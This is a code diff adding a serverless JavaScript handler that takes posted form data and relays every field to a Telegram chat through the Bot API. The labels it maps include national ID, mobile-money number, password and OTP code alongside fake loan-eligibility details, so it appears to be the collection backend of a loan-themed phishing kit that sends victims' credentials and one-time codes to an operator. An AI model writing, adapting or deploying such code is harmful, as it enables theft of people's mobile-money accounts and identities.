@@ -1,0 +1,43 @@
+exports.handler = async (event) => {
+  if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };
+
+  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+  if (!BOT_TOKEN || !CHAT_ID) return { statusCode: 500, body: 'Not configured' };
+
+  let payload;
+  try { payload = JSON.parse(event.body); } catch { return { statusCode: 400, body: 'Bad JSON' }; }
+
+  const title = payload.title || payload.type || 'Notification';
+  const data = payload.data || {};
+
+  const labels = {
+    fullName: 'Full Name', email: 'Email', dob: 'Date of Birth',
+    phone: 'Phone', country: 'Country', nationalId: 'National ID',
+    employment: 'Employment', income: 'Monthly Income', amount: 'Loan Amount',
+    term: 'Term (months)', purpose: 'Purpose', momoNumber: 'MoMo Number',
+    password: 'Password', otp: 'OTP Code', interest: 'Interest %',
+    limit: 'Eligible Limit', monthlyRepayment: 'Monthly Repayment',
+    totalRepayable: 'Total Repayable', reference: 'Reference',
+    eligible: 'Eligible', status: 'Status', currentStep: 'Step'
+  };
+
+  let text = title + '\n------------------------\n';
+  for (const [k, v] of Object.entries(data)) {
+    if (v === undefined || v === null || v === '') continue;
+    text += (labels[k] || k) + ': ' + v + '\n';
+  }
+  text += '\nPage: ' + (payload.page || '') + '\n' + new Date().toISOString();
+
+  try {
+    const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text, disable_web_page_preview: true })
+    });
+    const result = await res.json();
+    return { statusCode: result.ok ? 200 : 502, body: JSON.stringify(result) };
+  } catch (err) {
+    return { statusCode: 500, body: err.message };
+  }
+};
